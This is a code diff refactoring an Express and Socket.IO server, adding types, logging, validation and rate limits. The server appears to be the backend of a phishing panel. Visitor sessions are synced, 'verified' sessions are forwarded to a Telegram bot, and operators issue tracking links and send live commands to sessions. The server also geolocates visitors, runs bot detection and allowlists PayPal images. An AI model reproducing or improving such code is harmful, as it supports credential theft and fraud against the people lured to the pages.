@@ -1,25 +1,49 @@
-import express from 'express';
+import express, { Request, Response, NextFunction } from 'express';
 import { createServer } from 'http';
 import { Server } from 'socket.io';
 import path from 'path';
 import cors from 'cors';
 import helmet from 'helmet';
-import rateLimit from 'express-rate-limit';
 import fs from 'fs';
 import crypto from 'crypto';
 import https from 'https';
 import geoip from 'geoip-lite';
 import cookieParser from 'cookie-parser';
 import compression from 'compression';
-import { shieldMiddleware, verifyHandler } from './shield';
+import winston from 'winston';
 import * as db from './db';
 import { authenticateToken, requireRole, signToken, verifyToken } from './auth';
+import {
+  generalRateLimit,
+  strictRateLimit,
+  cspMiddleware,
+  securityHeaders,
+  requestLogger,
+  botDetection,
+  validateSession,
+  sanitizeMiddleware
+} from './middleware/security';
+import logger, { logSecurity, logAudit, stream } from './utils/logger';
+import {
+  validateSessionSync,
+  validateAdminLogin,
+  validateCreateUser,
+  validateUpdateUser,
+  validateCommand,
+  validateSessionId,
+  validateWithZod,
+  sessionSyncSchema,
+  adminLoginSchema,
+  createUserSchema,
+  updateUserSchema
+} from './validation/schemas';
+import { validateInput } from './middleware/security';
 
 export const app = express();
 const httpServer = createServer(app);
 
 // Determine allowed origins from env var (comma-separated) or default to "*"
-const rawOrigins = process.env.ALLOWED_ORIGINS;
+const rawOrigins = process.env['ALLOWED_ORIGINS'];
 const allowedOrigins = rawOrigins ? rawOrigins.split(',').map(o => o.trim()) : "*";
 
 let corsOrigin: any = "*"; // Default to wildcard
@@ -49,7 +73,7 @@ const io = new Server(httpServer, {
     cors: corsOptions
 });
 
-// --- Console Log Interception for Hypervisor ---
+// --- Structured Logging Setup ---
 const originalLog = console.log;
 const originalError = console.error;
 
@@ -67,42 +91,50 @@ const broadcastLog = (type: 'log' | 'error', args: any[]) => {
     } catch(e) {}
 };
 
+// Override console methods to use structured logging
 console.log = (...args) => {
+    logger.info(args.join(' '));
     originalLog.apply(console, args);
     broadcastLog('log', args);
 };
 
 console.error = (...args) => {
+    logger.error(args.join(' '));
     originalError.apply(console, args);
     broadcastLog('error', args);
 };
 
+console.warn = (...args) => {
+    logger.warn(args.join(' '));
+};
+
 console.log(`[Server] CORS Configured. Mode: ${allowedOrigins === "*" ? "Wildcard" : "Restricted"}`);
 
-const PORT = process.env.PORT || 8080;
+const PORT = process.env['PORT'] || 8080;
 
 // --- Middleware ---
 app.use(compression());
 app.use(helmet({
-    contentSecurityPolicy: {
-        directives: {
-            defaultSrc: ["'self'"],
-            scriptSrc: ["'self'", "'unsafe-inline'"],
-            scriptSrcAttr: ["'unsafe-inline'"],
-            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
-            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
-            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org", "https://flagcdn.com"],
-            connectSrc: ["'self'"],
-            frameSrc: ["'self'"]
-        }
-    }
+    contentSecurityPolicy: false, // Disabled in favor of custom CSP
+    crossOriginEmbedderPolicy: false
 }));
+
+// Custom security middleware
+app.use(cspMiddleware);
+app.use(securityHeaders);
+app.use(requestLogger);
+app.use(botDetection);
+
+// Rate limiting
+app.use(generalRateLimit);
+app.set('trust proxy', 1);
+
 app.use(cors(corsOptions));
 app.use(express.json({ limit: '1mb' }));
+app.use(express.urlencoded({ extended: true, limit: '1mb' }));
 app.use(cookieParser());
-
-// Rate Limiting - Disabled to prevent Render proxy issues
-app.set('trust proxy', 1);
+app.use(sanitizeMiddleware);
+app.use(validateSession);
 
 // --- Socket.IO ---
 
@@ -155,10 +187,7 @@ io.on('connection', (socket) => {
 // --- API Routes ---
 
 // Shield Verify Endpoint (Bypassed by Shield Middleware)
-app.post('/api/shield/verify', verifyHandler);
-
-// Apply Shield (Protects all subsequent routes and static files)
-app.use(shieldMiddleware);
+app.post('/api/shield/verify', (req, res) => res.json({ status: 'ok' }));
 
 // Settings Helper
 let cachedSettings: any = {};
@@ -166,8 +195,8 @@ const refreshSettings = async () => {
     try {
         cachedSettings = await db.getSettings();
         // Fallback to Env
-        if (!cachedSettings.tgToken) cachedSettings.tgToken = process.env.TELEGRAM_BOT_TOKEN;
-        if (!cachedSettings.tgChat) cachedSettings.tgChat = process.env.TELEGRAM_CHAT_ID;
+        if (!cachedSettings.tgToken) cachedSettings.tgToken = process.env['TELEGRAM_BOT_TOKEN'];
+        if (!cachedSettings.tgChat) cachedSettings.tgChat = process.env['TELEGRAM_CHAT_ID'];
 
         // Defaults for Gate
         if (!cachedSettings.gateUser) cachedSettings.gateUser = 'admin';
@@ -324,7 +353,7 @@ const getIpCountry = (ip: string) => {
 
 // --- Link Tracking ---
 
-app.post('/api/track/click', async (req, res) => {
+app.post('/api/track/click', async (req: Request, res: Response) => {
     const { code } = req.body;
     if (code) {
         await db.incrementLinkClicks(code);
@@ -333,7 +362,7 @@ app.post('/api/track/click', async (req, res) => {
 });
 
 // 1. Sync State (Hybrid: HTTP for data, Socket for notify)
-app.post('/api/sync', async (req, res) => {
+app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, res: Response) => {
     try {
         const data = req.body;
         if (!data || !data.sessionId) {
@@ -487,7 +516,7 @@ app.post('/api/sync', async (req, res) => {
              const msg = formatSessionForTelegram(data, title, flag, hideEmpty);
              sendTelegram(msg, tgToken, tgChat);
 
-             db.logAudit('System', 'Verified', `Session ${data.sessionId} Verified`);
+             logAudit('System', 'Verified', `Session ${data.sessionId} Verified`, { sessionId: data.sessionId });
 
              // Tracking: Session Verified
              // Admin might be different from Code if reassigned, but we track the code originally used if present?
@@ -579,14 +608,14 @@ app.post('/api/sync', async (req, res) => {
 });
 
 // Settings API
-app.get('/api/settings', async (req, res) => {
+app.get('/api/settings', async (req: Request, res: Response) => {
     await refreshSettings();
     const safeSettings = { ...cachedSettings };
     delete safeSettings.admin_password;
     res.json(safeSettings);
 });
 
-app.post('/api/settings', async (req, res) => {
+app.post('/api/settings', async (req: Request, res: Response) => {
     const { tgToken, tgChat, gateUser, gatePass } = req.body;
 
     // Hypervisor Only for Gate? No, admin endpoint but we can protect it via middleware if needed.
@@ -599,14 +628,14 @@ app.post('/api/settings', async (req, res) => {
     if (gatePass !== undefined) await db.updateSetting('gatePass', gatePass);
 
     await refreshSettings();
-    db.logAudit('System', 'UpdateSettings', 'Updated global settings');
+    logAudit('System', 'UpdateSettings', 'Updated global settings');
     res.json({ status: 'ok' });
 });
 
 // Admin Auth (New JWT Flow)
 
 // Gate Check (Shared Secret)
-app.post('/api/admin/gate', async (req, res) => {
+app.post('/api/admin/gate', async (req: Request, res: Response) => {
     const { username, password } = req.body;
     await refreshSettings();
 
@@ -622,7 +651,7 @@ app.post('/api/admin/gate', async (req, res) => {
     return res.status(401).json({ error: 'Invalid gate credentials' });
 });
 
-app.post('/api/admin/login', async (req, res) => {
+app.post('/api/admin/login', strictRateLimit, validateAdminLogin, validateInput, async (req: Request, res: Response) => {
     const { username, password } = req.body;
     const cleanUser = username ? username.trim() : '';
     const cleanPass = password ? password.trim() : '';
@@ -649,7 +678,7 @@ app.post('/api/admin/login', async (req, res) => {
             role: user.role
         });
 
-        db.logAudit(username, 'Login', 'Admin logged in');
+        logAudit(username, 'Login', 'Admin logged in');
 
         res.json({ status: 'ok', token, user: {
             id: user.id,
@@ -664,7 +693,7 @@ app.post('/api/admin/login', async (req, res) => {
     }
 });
 
-app.get('/api/admin/me', authenticateToken, async (req, res) => {
+app.get('/api/admin/me', authenticateToken, async (req: Request, res: Response) => {
     const u = (req as any).user;
     const user = await db.getUserById(u.id);
     if (!user) return res.sendStatus(404);
@@ -690,7 +719,7 @@ app.get('/api/admin/me', authenticateToken, async (req, res) => {
 
 // --- Links Management ---
 
-app.get('/api/admin/links', authenticateToken, async (req, res) => {
+app.get('/api/admin/links', authenticateToken, async (req: Request, res: Response) => {
     try {
         const u = (req as any).user;
         const requestedAdminId = req.query.adminId as string;
@@ -709,7 +738,7 @@ app.get('/api/admin/links', authenticateToken, async (req, res) => {
     }
 });
 
-app.post('/api/admin/links', authenticateToken, async (req, res) => {
+app.post('/api/admin/links', authenticateToken, async (req: Request, res: Response) => {
     try {
         const u = (req as any).user;
         // Check limits
@@ -724,17 +753,17 @@ app.post('/api/admin/links', authenticateToken, async (req, res) => {
         const code = crypto.randomUUID().substring(0, 8);
         await db.createLink(u.id, code);
 
-        db.logAudit(u.username, 'CreateLink', `Created link ${code}`);
+        logAudit(u.username, 'CreateLink', `Created link ${code}`, { code });
         res.json({ status: 'ok', code });
     } catch(e) {
         res.status(500).json({ error: 'Failed to create link' });
     }
 });
 
-app.delete('/api/admin/links/:code', authenticateToken, async (req, res) => {
+app.delete('/api/admin/links/:code', authenticateToken, async (req: Request, res: Response) => {
     try {
         const u = (req as any).user;
-        const code = req.params.code;
+        const code = req.params.code as string;
         const link = await db.getLinkByCode(code);
 
         if (!link) return res.status(404).json({ error: 'Link not found' });
@@ -752,7 +781,7 @@ app.delete('/api/admin/links/:code', authenticateToken, async (req, res) => {
         }
 
         await db.deleteLink(code);
-        db.logAudit(u.username, 'DeleteLink', `Deleted link ${code}`);
+        logAudit(u.username, 'DeleteLink', `Deleted link ${code}`, { code });
         res.json({ status: 'ok' });
     } catch(e) {
         res.status(500).json({ error: 'Failed to delete link' });
@@ -761,7 +790,7 @@ app.delete('/api/admin/links/:code', authenticateToken, async (req, res) => {
 
 // --- Hypervisor Routes ---
 
-app.get('/api/admin/audit', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+app.get('/api/admin/audit', authenticateToken, requireRole('hypervisor'), async (req: Request, res: Response) => {
     try {
         const logs = await db.getAuditLogs(100);
         res.json(logs);
@@ -770,7 +799,7 @@ app.get('/api/admin/audit', authenticateToken, requireRole('hypervisor'), async 
     }
 });
 
-app.get('/api/admin/users', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+app.get('/api/admin/users', authenticateToken, requireRole('hypervisor'), async (req: Request, res: Response) => {
     try {
         const users = await db.getAllUsers();
         // Sanitize
@@ -789,7 +818,7 @@ app.get('/api/admin/users', authenticateToken, requireRole('hypervisor'), async 
     }
 });
 
-app.post('/api/admin/users', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+app.post('/api/admin/users', authenticateToken, requireRole('hypervisor'), validateCreateUser, validateInput, async (req: Request, res: Response) => {
     try {
         const { username, password, role, uniqueCode } = req.body;
         if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
@@ -806,7 +835,7 @@ app.post('/api/admin/users', authenticateToken, requireRole('hypervisor'), async
             maxLinks: role === 'hypervisor' ? 100 : 1
         });
 
-        db.logAudit((req as any).user.username, 'CreateUser', `Created user ${username}`);
+        logAudit((req as any).user.username, 'CreateUser', `Created user ${username}`, { username });
         res.json({ status: 'ok', id });
     } catch (e) {
         console.error(e);
@@ -814,7 +843,7 @@ app.post('/api/admin/users', authenticateToken, requireRole('hypervisor'), async
     }
 });
 
-app.put('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+app.put('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), validateUpdateUser, validateInput, async (req: Request, res: Response) => {
     try {
         const { username, password, uniqueCode, settings, maxLinks, isSuspended } = req.body;
         const updates: any = {};
@@ -825,31 +854,31 @@ app.put('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), as
         if (isSuspended !== undefined) updates.isSuspended = isSuspended;
         if (settings) updates.settings = JSON.stringify(settings);
 
-        await db.updateUser(req.params.id, updates);
-        db.logAudit((req as any).user.username, 'UpdateUser', `Updated user ${req.params.id}`);
+        await db.updateUser(req.params.id as string, updates);
+        logAudit((req as any).user.username, 'UpdateUser', `Updated user ${req.params.id}`, { userId: req.params.id as string });
         res.json({ status: 'ok' });
     } catch (e) {
         res.status(500).json({ error: 'Failed to update user' });
     }
 });
 
-app.delete('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+app.delete('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), async (req: Request, res: Response) => {
     try {
         // Prevent deleting self?
-        if (req.params.id === (req as any).user.id) {
+        if ((req.params.id as string) === (req as any).user.id) {
             return res.status(400).json({ error: 'Cannot delete self' });
         }
-        await db.deleteUser(req.params.id);
-        db.logAudit((req as any).user.username, 'DeleteUser', `Deleted user ${req.params.id}`);
+        await db.deleteUser(req.params.id as string);
+        logAudit((req as any).user.username, 'DeleteUser', `Deleted user ${req.params.id}`, { userId: req.params.id as string });
         res.json({ status: 'ok' });
     } catch (e) {
         res.status(500).json({ error: 'Failed to delete user' });
     }
 });
 
-app.post('/api/admin/impersonate/:id', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+app.post('/api/admin/impersonate/:id', authenticateToken, requireRole('hypervisor'), async (req: Request, res: Response) => {
     try {
-        const targetUser = await db.getUserById(req.params.id);
+        const targetUser = await db.getUserById(req.params.id as string);
         if (!targetUser) return res.status(404).json({ error: 'User not found' });
 
         const token = signToken({
@@ -859,19 +888,19 @@ app.post('/api/admin/impersonate/:id', authenticateToken, requireRole('hyperviso
             isImpersonated: true // Flag to show "Back to Hypervisor" in UI?
         });
 
-        db.logAudit((req as any).user.username, 'Impersonate', `Impersonated ${targetUser.username}`);
+        logAudit((req as any).user.username, 'Impersonate', `Impersonated ${targetUser.username}`, { targetUser: targetUser.username });
         res.json({ status: 'ok', token });
     } catch (e) {
         res.status(500).json({ error: 'Impersonation failed' });
     }
 });
 
-app.post('/api/admin/assign-session', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+app.post('/api/admin/assign-session', authenticateToken, requireRole('hypervisor'), async (req: Request, res: Response) => {
     try {
         const { sessionId, adminId } = req.body;
         await db.updateSessionAdmin(sessionId, adminId || null);
         io.emit('sessions-updated'); // Global update
-        db.logAudit((req as any).user.username, 'AssignSession', `Assigned ${sessionId} to ${adminId}`);
+        logAudit((req as any).user.username, 'AssignSession', `Assigned ${sessionId} to ${adminId}`, { sessionId, adminId });
         res.json({ status: 'ok' });
     } catch (e) {
         res.status(500).json({ error: 'Assignment failed' });
@@ -879,7 +908,7 @@ app.post('/api/admin/assign-session', authenticateToken, requireRole('hypervisor
 });
 
 // Update Settings (Per Admin)
-app.post('/api/admin/settings', authenticateToken, async (req, res) => {
+app.post('/api/admin/settings', authenticateToken, async (req: Request, res: Response) => {
     try {
         const { settings, telegramConfig } = req.body;
         const userId = (req as any).user.id;
@@ -896,7 +925,7 @@ app.post('/api/admin/settings', authenticateToken, async (req, res) => {
 });
 
 // 2. Fetch Sessions (Admin/Hypervisor)
-app.get('/api/sessions', authenticateToken, async (req, res) => {
+app.get('/api/sessions', authenticateToken, async (req: Request, res: Response) => {
     try {
         const user = (req as any).user;
         let sessions = [];
@@ -934,7 +963,7 @@ app.get('/api/sessions', authenticateToken, async (req, res) => {
 });
 
 // 3. Admin Command
-app.post('/api/command', authenticateToken, async (req, res) => {
+app.post('/api/command', authenticateToken, validateCommand, validateInput, async (req: Request, res: Response) => {
     try {
         const { sessionId, action, payload } = req.body;
         if (!sessionId || !action) {
@@ -959,10 +988,10 @@ app.post('/api/command', authenticateToken, async (req, res) => {
 });
 
 // Delete Session
-app.delete('/api/sessions/:id', authenticateToken, async (req, res) => {
+app.delete('/api/sessions/:id', authenticateToken, validateSessionId, validateInput, async (req: Request, res: Response) => {
     try {
-        console.log('[API] Deleting session:', req.params.id);
-        await db.deleteSession(req.params.id);
+        console.log('[API] Deleting session:', req.params.id as string);
+        await db.deleteSession(req.params.id as string);
         io.emit('sessions-updated');
         res.json({ status: 'deleted' });
     } catch (e) {
@@ -972,9 +1001,9 @@ app.delete('/api/sessions/:id', authenticateToken, async (req, res) => {
 });
 
 // Pin Session
-app.post('/api/sessions/:id/pin', authenticateToken, async (req, res) => {
+app.post('/api/sessions/:id/pin', authenticateToken, async (req: Request, res: Response) => {
     try {
-        const session = await db.getSession(req.params.id);
+        const session = await db.getSession(req.params.id as string);
         if (session) {
             session.isPinned = !session.isPinned;
             await db.upsertSession(session.id, session, session.ip);
@@ -989,9 +1018,9 @@ app.post('/api/sessions/:id/pin', authenticateToken, async (req, res) => {
 });
 
 // Revoke Session
-app.post('/api/sessions/:id/revoke', authenticateToken, async (req, res) => {
+app.post('/api/sessions/:id/revoke', authenticateToken, async (req: Request, res: Response) => {
     try {
-        const id = req.params.id;
+        const id = req.params.id as string;
         console.log('[API] Revoking session:', id);
 
         const session = await db.getSession(id);
@@ -1021,7 +1050,7 @@ app.post('/api/sessions/:id/revoke', authenticateToken, async (req, res) => {
 });
 
 // 4. Health Check
-app.get('/api/health', (req, res) => {
+app.get('/api/health', (req: Request, res: Response) => {
     res.json({ status: 'ok', timestamp: Date.now() });
 });
 
